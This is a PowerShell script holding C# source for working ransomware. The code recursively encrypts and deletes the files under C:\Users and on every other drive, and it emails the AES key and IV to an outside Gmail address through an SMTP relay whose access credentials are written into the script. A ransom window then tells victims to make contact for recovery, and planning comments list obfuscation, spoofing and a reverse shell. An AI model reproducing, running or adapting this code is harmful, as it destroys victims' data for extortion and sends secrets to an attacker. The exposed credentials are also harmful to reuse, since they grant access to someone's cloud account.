$code = @"


/*program start, specifies a root directory for each drive and 
executes the encrypt class*/
using System;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Net.Mail;
using System.Net;
//using System.Management.Automation;
////WARNING: DO NOT RUN, WILL KILL UR COMPUTER
////WARNING: DO NOT RUN, WILL KILL UR COMPUTER
////WARNING: DO NOT RUN, WILL KILL UR COMPUTER
////WARNING: DO NOT RUN, WILL KILL UR COMPUTER
////WARNING: DO NOT RUN, WILL KILL UR COMPUTER
////WARNING: DO NOT RUN, WILL KILL UR COMPUTER

/*To do list
0.  create victim id system
1.  base 64 to hide code
2.  write decryption macro to keep algorithm private
3.1 change delete permissions for sys files and other users
3.5 remove browsers from targets
4.  Send Key over email
5.  Decrypt.exe
6.  integrate emails
*/

/*bonus tasks
          !!!!!find parent os files from vm
          0) change wallpaper
          0.5) spoof email address 
          1) encrypt cloud
          2) redesign website
          3) reverse shell*/

namespace HybridPowershellVirus
{
    public class Init
    {
        public static void Main()
        {
            Aes aes = Aes.Create();
            //aes.Key = Convert.FromBase64String("oUlot5Ht76M8nZQctBm9fsxmwryg3zlHqc+dh9dFXuQ=");
           // aes.IV = Convert.FromBase64String("VmdKsgbqzClEkgdDJdwHhQ==");
            sendMail(aes.Key, aes.IV);
            //make a list of all existing folders we want to encrypt
            List<string> startFolders = FindDirectories();
            if (startFolders.Count > 0)
            {
                //recursively encrypt all files found in startFolders[]
                foreach (string d in startFolders)
                {
                    FetchFiles(d, aes);
                }
            }
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string filepath = path + "\\ID.txt";
            string new_path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string new_filepath = new_path + "\\ID.txt";
            File.Move(filepath, new_filepath);
        }


        private static List<string> FindDirectories()
        {
            List<string> startFolders = new List<string>();
            //add default windows directories to target folders
            string[] commonFolders = { @"C:\Users"}/*, @"C:\Documents", @"C:\Desktop", @"C:\Pictures", @"C:\Downloads", @"C:\Videos" }*/;
            foreach (string c in commonFolders)
                if (Directory.Exists(c))
                {
                    startFolders.Add(c);
                }
            //add all external directories to target folders
            char external = 'D';
            while (Directory.Exists(external + ":"))
            {
                startFolders.Add(external++ + ":");
            }
            return startFolders;
        }


        private static void FetchFiles(string start, Aes aes)
        {
            //list all files and subdirectories in the current folder
            string[] filesHere = Directory.GetFiles(start);
            string[] directHere = Directory.GetDirectories(start);
            if (filesHere.Length > 0 )
            {
                //encrypt the files
                foreach (string f in filesHere)
                {
                    //Console.WriteLine(f + "\n");
                    try
                    {
                        EncryptFile(new FileInfo(f), aes);
                        File.Delete(f);
                    }
                    catch
                    {
                        //Console.WriteLine("Sean thinks you don't have write permissions");
                        //Console.WriteLine(e);
                    }
                }
            }

            if (directHere.Length > 0)
            {
                //recursive call on all subdirectories
                foreach (string d in directHere)
                {
                  if (!d.Contains("AppData"))
                    {
                        try
                        {
                            FetchFiles(d, aes);
                        }
                        catch
                        {
                            //Console.WriteLine(e);
                        }
                    }
                }
            }
        }


        private static void sendMail(byte[] key, byte[] IV)
        {
            string keybase64 = Convert.ToBase64String(key);
            string IV64 = Convert.ToBase64String(IV);

            Random rand = new Random();
            int num = rand.Next();

            string ID = num + "";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string filepath = path + "\\ID.txt";
            File.WriteAllText(filepath, ID);

            var smtpClient = new SmtpClient("email-smtp.us-west-1.amazonaws.com")
            {
                Port = 587,
                Credentials = new NetworkCredential("AKIAW6THBJS24YTIMDM3", "BOckXK2y3MSij4f8v9K4y5Zu/Sar4Sq+802OTLmTK3JR"),
                EnableSsl = true,

            };

            smtpClient.Send("SaraHam8760@gmail.com", "SaraHam8760@gmail.com", ID,
            "Key: " + keybase64 + "       " + "IV: " + IV64);
        }


        private static void EncryptFile(FileInfo f, Aes aes)
        {
            //create a new AES Key and Initialization Vector

            ICryptoTransform transform = aes.CreateEncryptor();
            //object changes f ile extension to .enc, preserving old extension as file name
            string outFile = Path.Combine(f.DirectoryName, Path.ChangeExtension(f.Name + f.Extension, ".enc"));
            //object generates renamed files and optional key files to outFile directory
            //key files are currently omitted
            using (var outFs = new FileStream(outFile, FileMode.Create))
            {
                //object writes encrypted data into .enc file
                using (var outStreamEncrypted =
                 new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                {
                    // By encrypting a chunk at
                    // a time, you can save memory
                    // and accommodate large files.
                    int count = 0;
                    int offset = 0;
                    // blockSizeBytes can be any arbitrary size.
                    int blockSizeBytes = aes.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];
                    int bytesRead = 0;
                    //combine all the objects and perform the encryption
                    using (var inFs = new FileStream(f.FullName, FileMode.Open))
                    {
                        do
                        {
                            count = inFs.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outStreamEncrypted.Write(data, 0, count);
                            bytesRead += blockSizeBytes;
                        } while (count > 0);
                    }
                    outStreamEncrypted.FlushFinalBlock();
                }
            }
        }
    }
}


"@
Add-Type -TypeDefinition $code -Language CSharp
iex "[HybridPowershellVirus.Init]::Main()"

Add-Type -AssemblyName System.Windows.Forms

Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form

$form.Text = 'WE HAVE ACCESSS TO YOUR FILES!!!!!!!!!'

$form.Size = New-Object System.Drawing.Size(1000,1000)

$form.StartPosition = 'CenterScreen'

$label = New-Object System.Windows.Forms.Label

$label.Location = New-Object System.Drawing.Point(100,200)

$label.Size = New-Object System.Drawing.Size(1000,200)

$label.Text = 'Your files have been compromised. If you ever want them back contact us at SaraHam8760@gmail.com. Send the ID number included in ID.txt on your desktop'

$form.Controls.Add($label)

$form.Topmost = $true

$result = $form.ShowDialog()
